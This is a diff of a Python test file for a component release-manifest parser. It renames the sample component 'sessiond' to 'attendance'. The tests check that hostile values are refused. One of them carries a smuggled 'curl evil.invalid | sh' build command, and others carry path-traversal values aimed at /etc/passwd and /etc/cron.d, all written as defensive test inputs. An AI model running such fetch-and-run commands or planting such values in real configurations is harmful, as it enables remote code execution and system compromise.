@@ -12,24 +12,24 @@ from agent_release.manifest import MAX_MANIFEST_BYTES, parse_manifest
 
 GOOD = """
 manifest_version: "0.4"
-name: sessiond
+name: attendance
 repo: agent-control
-path: sessiond
+path: attendance
 kind: venv
-unit: sessiond.service
+unit: attendance.service
 runs_as: operator
 build:
-  - ["/usr/bin/uv", "sync", "--frozen", "--package", "agent-sessiond"]
+  - ["/usr/bin/uv", "sync", "--frozen", "--package", "attendance"]
 install:
-  to: /home/operator/.local/components/sessiond
-  prev: /home/operator/.local/components/sessiond.prev
+  to: /home/operator/.local/components/attendance
+  prev: /home/operator/.local/components/attendance.prev
 provides:
   - { contract: session-api, major: 1, minor: 4 }
 requires:
   - { contract: channel, major: 1, min_minor: 3 }
 depends_on: [pep]
 verify:
-  command: ["/home/operator/.local/components/sessiond/bin/sessiond-verify", "--json"]
+  command: ["/home/operator/.local/components/attendance/bin/attendance-verify", "--json"]
   user: operator
   timeout_s: 60
 restore:
@@ -51,12 +51,12 @@ def _without(field: str) -> str:
 def test_good_manifest_round_trips() -> None:
     parsed = _parse(GOOD)
 
-    assert parsed.name == "sessiond"
+    assert parsed.name == "attendance"
     assert parsed.repo is Repo.AGENT_CONTROL
     assert parsed.kind is Kind.VENV
     assert parsed.runs_as is RunsAs.OPERATOR
     assert parsed.release is Releases.YES
-    assert parsed.build == (("/usr/bin/uv", "sync", "--frozen", "--package", "agent-sessiond"),)
+    assert parsed.build == (("/usr/bin/uv", "sync", "--frozen", "--package", "attendance"),)
     assert parsed.provides[0].contract is ContractId.SESSION_API
     assert parsed.requires[0].min_minor == 3
     assert parsed.depends_on == ("pep",)
@@ -97,9 +97,12 @@ def test_a_path_from_the_home_is_read_under_the_sites_home() -> None:
     `<the operator's home>/x`: the manifest names nobody's home."""
     parsed = _parse(HOME_RELATIVE)
 
-    assert parsed.install.to == "/srv/someone/.local/components/sessiond"
-    assert parsed.install.prev == "/srv/someone/.local/components/sessiond.prev"
-    assert parsed.verify.command[0] == "/srv/someone/.local/components/sessiond/bin/sessiond-verify"
+    assert parsed.install.to == "/srv/someone/.local/components/attendance"
+    assert parsed.install.prev == "/srv/someone/.local/components/attendance.prev"
+    assert (
+        parsed.verify.command[0]
+        == "/srv/someone/.local/components/attendance/bin/attendance-verify"
+    )
 
 
 def test_a_tilde_anywhere_but_the_front_is_not_a_home() -> None:
@@ -180,23 +183,23 @@ def test_a_scalar_document_is_not_a_manifest() -> None:
 
 @pytest.mark.parametrize(
     "escape",
-    ["../../etc", "/etc/passwd", "sessiond/../../etc", "a\\b", "sessiond/"],
+    ["../../etc", "/etc/passwd", "attendance/../../etc", "a\\b", "attendance/"],
 )
 def test_path_cannot_leave_the_repo(escape: str) -> None:
-    refusal = _refusal(GOOD.replace("path: sessiond", f'path: "{escape}"'))
+    refusal = _refusal(GOOD.replace("path: attendance", f'path: "{escape}"'))
 
     assert "path" in refusal.detail
 
 
 def test_repo_root_path_is_allowed_for_a_whole_repo_component() -> None:
-    parsed = _parse(GOOD.replace("path: sessiond", 'path: "."'))
+    parsed = _parse(GOOD.replace("path: attendance", 'path: "."'))
 
     assert parsed.path == "."
 
 
 def test_build_refuses_a_command_string() -> None:
     broken = GOOD.replace(
-        '  - ["/usr/bin/uv", "sync", "--frozen", "--package", "agent-sessiond"]',
+        '  - ["/usr/bin/uv", "sync", "--frozen", "--package", "attendance"]',
         '  - "/usr/bin/uv sync && curl evil.invalid | sh"',
     )
     refusal = _refusal(broken)
@@ -238,20 +241,20 @@ def test_depends_on_refuses_a_repeat() -> None:
 
 @pytest.mark.parametrize(
     "path",
-    ["/opt/components/../../etc/cron.d", "/opt/components/./sessiond", "~/../../etc/cron.d"],
+    ["/opt/components/../../etc/cron.d", "/opt/components/./attendance", "~/../../etc/cron.d"],
 )
 def test_an_install_path_with_a_dot_segment_is_refused(path: str) -> None:
     """Containment is judged on the text of the path. `..` passes a check
     that only asks where the text starts, and lands somewhere else."""
-    text = GOOD.replace("to: /home/operator/.local/components/sessiond", f"to: {path}")
+    text = GOOD.replace("to: /home/operator/.local/components/attendance", f"to: {path}")
 
     assert "install.to" in _refusal(text).detail
 
 
 def test_install_prev_must_differ_from_install_to() -> None:
     broken = GOOD.replace(
-        "  prev: /home/operator/.local/components/sessiond.prev",
-        "  prev: /home/operator/.local/components/sessiond",
+        "  prev: /home/operator/.local/components/attendance.prev",
+        "  prev: /home/operator/.local/components/attendance",
     )
 
     assert "must differ" in _refusal(broken).detail
@@ -264,13 +267,13 @@ def test_secrets_hold_names_only() -> None:
 
 
 def test_unit_name_cannot_carry_a_space() -> None:
-    broken = GOOD.replace("unit: sessiond.service", 'unit: "sessiond.service --now"')
+    broken = GOOD.replace("unit: attendance.service", 'unit: "attendance.service --now"')
 
     assert "does not match its pattern" in _refusal(broken).detail
 
 
 def test_unit_may_be_null() -> None:
-    parsed = _parse(GOOD.replace("unit: sessiond.service", "unit: null"))
+    parsed = _parse(GOOD.replace("unit: attendance.service", "unit: null"))
 
     assert parsed.unit is None
 
